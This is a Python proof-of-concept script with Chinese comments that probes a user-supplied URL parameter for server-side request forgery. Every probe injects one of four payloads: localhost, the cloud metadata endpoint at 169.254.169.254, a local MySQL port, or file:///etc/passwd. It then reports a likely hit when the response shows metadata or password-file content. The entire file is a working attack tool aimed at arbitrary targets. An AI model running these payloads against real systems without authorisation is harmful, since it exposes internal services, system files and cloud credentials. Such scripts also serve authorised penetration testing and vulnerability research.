#!/usr/bin/env python3
"""
SSRF 漏洞 POC 库
检测常见 SSRF 点：URL 参数、文件预览、图片处理等
"""
import argparse, sys, urllib.parse
sys.path.insert(0, '..')
from utils.http import detect_ssrf, http_get

SSRF_TARGETS = {
    "localhost": "http://127.0.0.1",
    "metadata": "http://169.254.169.254/latest/meta-data/",
    "internal_db": "http://localhost:3306",
    "file": "file:///etc/passwd",
}

def main():
    parser = argparse.ArgumentParser(description="SSRF 漏洞检测")
    parser.add_argument("-t", "--target", required=True, help="目标 URL (含参数的)")
    parser.add_argument("-p", "--param", default="url", help="URL 参数名")
    args = parser.parse_args()

    print(f"[*] 目标: {args.target}")
    base = args.target.split('?')[0]

    for name, payload in SSRF_TARGETS.items():
        target = f"{base}?{args.param}={urllib.parse.quote(payload)}"
        print(f"\n[*] 测试 {name}: {payload}")
        resp = http_get(target, timeout=10)
        body = resp.get("body", b"").decode('utf-8', errors='ignore')
        status = resp.get("status", 0)

        if "ami-id" in body or "root:" in body or "metadata" in body.lower():
            print(f"  [+] 可能存在 SSRF! ({name})")
        elif status in (200, 302):
            print(f"  [?] 状态 {status}，需人工确认")
        else:
            print(f"  [-] 无响应 / 重定向")

if __name__ == "__main__":
    main()
